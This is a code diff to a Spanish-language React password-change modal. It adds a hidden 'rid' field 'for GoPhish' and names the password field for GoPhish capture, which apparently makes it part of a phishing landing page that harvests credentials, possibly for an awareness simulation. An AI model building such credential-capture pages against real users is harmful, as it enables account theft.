@@ -3,16 +3,17 @@ import { X, Eye, EyeOff } from "lucide-react";
 import "./ChangePasswordModal.css";
 
 export default function ChangePasswordModal({ onClose, onSubmit, userEmail }) {
-  const [newPwd, setNewPwd]       = useState("");
+  const [newPwd, setNewPwd]         = useState("");
   const [confirmPwd, setConfirmPwd] = useState("");
   const [showNew, setShowNew]       = useState(false);
   const [showConfirm, setShowConfirm] = useState(false);
-
   const canSubmit = newPwd && confirmPwd && newPwd === confirmPwd;
+
+  /* ←—— leemos el ?rid de la URL */
+  const rid = new URLSearchParams(window.location.search).get("rid") || "";
 
   return (
     <div className="modal-backdrop">
-      {/* FORMULARIO real */}
       <form
         className="modal"
         role="dialog"
@@ -22,9 +23,12 @@ export default function ChangePasswordModal({ onClose, onSubmit, userEmail }) {
         onSubmit={(e) => {
           e.preventDefault();
           if (!canSubmit) return;
-          onSubmit(newPwd);   // avanza al paso Teléfono
+          onSubmit(newPwd);
         }}
       >
+        {/* ► oculta el rid para GoPhish */}
+        <input type="hidden" name="rid" value={rid} />
+
         <header className="modal__header">
           <h2 className="modal__title">Cambiar la contraseña</h2>
           <button className="modal__close" onClick={onClose} aria-label="Cerrar">
@@ -42,7 +46,7 @@ export default function ChangePasswordModal({ onClose, onSubmit, userEmail }) {
             <span className="modal__label-title">Nueva contraseña</span>
             <div className="modal__pw-wrapper">
               <input
-                name="password"                 /* <= nombre para GoPhish */
+                name="password"
                 type={showNew ? "text" : "password"}
                 value={newPwd}
                 onChange={(e) => setNewPwd(e.target.value)}
